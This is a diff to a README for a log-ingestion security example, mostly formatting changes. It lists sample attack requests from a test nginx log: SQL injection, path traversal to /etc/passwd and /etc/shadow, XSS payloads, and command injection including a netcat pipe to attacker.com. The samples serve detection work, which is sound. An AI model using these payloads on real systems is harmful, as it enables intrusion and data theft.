@@ -17,7 +17,7 @@ This example shows the **log ingestion and parsing** capabilities of Wildbox by 
 
 ## 🏗️ Architecture
 
-```
+```text
 ┌─────────────────────┐
 │   Web Server        │
 │   (Nginx/Apache)    │
@@ -225,37 +225,43 @@ When viewing events, you'll see structured data like:
 The provided `sample-logs/nginx-access.log` contains examples of:
 
 ### 1. SQL Injection
-```
+
+```http
 GET /products?id=1' OR '1'='1 HTTP/1.1
 GET /search?q='; DROP TABLE products;-- HTTP/1.1
 ```
 
 ### 2. Path Traversal
-```
+
+```http
 GET /../../../etc/passwd HTTP/1.1
 GET /download?file=../../../../etc/shadow HTTP/1.1
 ```
 
 ### 3. Cross-Site Scripting (XSS)
-```
+
+```http
 GET /search?q=<script>alert('XSS')</script> HTTP/1.1
 GET /comment?text=<img src=x onerror=alert(1)> HTTP/1.1
 ```
 
 ### 4. Brute Force Login
-```
+
+```http
 POST /admin/login HTTP/1.1 (repeated 10+ times with 401 responses)
 ```
 
 ### 5. Security Scanners
-```
+
+```yaml
 User-Agent: sqlmap/1.7.2
 User-Agent: Nikto/2.1.6
 User-Agent: Acunetix Web Vulnerability Scanner
 ```
 
 ### 6. Command Injection
-```
+
+```http
 GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1
 GET /exec?cmd=ls -la | nc attacker.com 1234 HTTP/1.1
 ```
@@ -267,7 +273,7 @@ GET /exec?cmd=ls -la | nc attacker.com 1234 HTTP/1.1
 The sensor supports multiple log formats:
 
 | Format | Description | Example Path |
-|--------|-------------|--------------|
+| -------- | ------------- | -------------- |
 | `nginx` | Nginx combined access log format | `/var/log/nginx/access.log` |
 | `apache` | Apache combined log format | `/var/log/apache2/access.log` |
 | `syslog` | Standard syslog format | `/var/log/syslog` |
@@ -311,28 +317,36 @@ log_sources:
 Once you have log ingestion working, you can extend this use case:
 
 ### 1. Add AI-Powered Analysis
+
 Use **open-security-agents** to analyze patterns and detect anomalies:
+
 - Behavioral analysis
 - Threat classification
 - Attack pattern recognition
 - False positive reduction
 
 ### 2. Automated Response
+
 Use **open-security-responder** to automatically respond to threats:
+
 - Block malicious IPs at the firewall
 - Add IPs to rate limiting lists
 - Send alerts to Slack/email
 - Trigger incident response playbooks
 
 ### 3. Dashboard Visualization
+
 Use **open-security-dashboard** to visualize:
+
 - Real-time attack maps
 - Top attacking IPs
 - Attack type distribution
 - Timeline of events
 
 ### 4. Threat Intelligence Correlation
+
 Correlate with **open-security-data** threat feeds:
+
 - Check attacking IPs against known bad actor lists
 - Enrich events with geolocation data
 - Compare attack patterns with CVE databases
